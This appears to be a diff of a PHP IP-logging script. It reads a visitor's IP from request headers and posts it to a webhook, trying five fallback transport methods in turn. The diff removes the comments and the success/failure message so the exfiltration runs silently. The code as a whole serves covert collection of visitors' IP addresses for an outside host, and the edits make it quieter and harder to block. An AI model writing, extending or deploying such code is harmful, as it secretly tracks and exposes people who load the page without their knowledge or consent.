@@ -13,7 +13,6 @@ foreach ($hdrs as $h) {
 $pl = json_encode(['content' => "User IP: $ip"]);
 
 function sendWebhook($url, $data) {
-    // 1. Using cURL
     if (function_exists('curl_version')) {
         $ch = curl_init($url);
         curl_setopt_array($ch, [
@@ -28,7 +27,6 @@ function sendWebhook($url, $data) {
         if (!$err) return true;
     }
 
-    // 2. Using file_get_contents (fopen method)
     if (ini_get('allow_url_fopen')) {
         $options = [
             'http' => [
@@ -42,7 +40,6 @@ function sendWebhook($url, $data) {
         if ($response !== false) return true;
     }
 
-    // 3. Using fsockopen
     $url_parts = parse_url($url);
     $fp = @fsockopen($url_parts['host'], 80, $errno, $errstr, 10);
     if ($fp) {
@@ -57,7 +54,6 @@ function sendWebhook($url, $data) {
         return true;
     }
 
-    // 4. Using stream_socket_client
     $fp = @stream_socket_client('tcp://' . $url_parts['host'] . ':80', $errno, $errstr, 10);
     if ($fp) {
         $headers = "POST " . $url_parts['path'] . " HTTP/1.1\r\n";
@@ -71,7 +67,6 @@ function sendWebhook($url, $data) {
         return true;
     }
 
-    // 5. Using fopen (as a last fallback)
     if (ini_get('allow_url_fopen')) {
         $file = @fopen($url, 'w');
         if ($file) {
@@ -84,9 +79,5 @@ function sendWebhook($url, $data) {
     return false;
 }
 
-if (sendWebhook($wh, $pl)) {
-    echo "Webhook sent successfully.";
-} else {
-    echo "Failed to send webhook.";
-}
+sendWebhook($wh, $pl);
 ?>
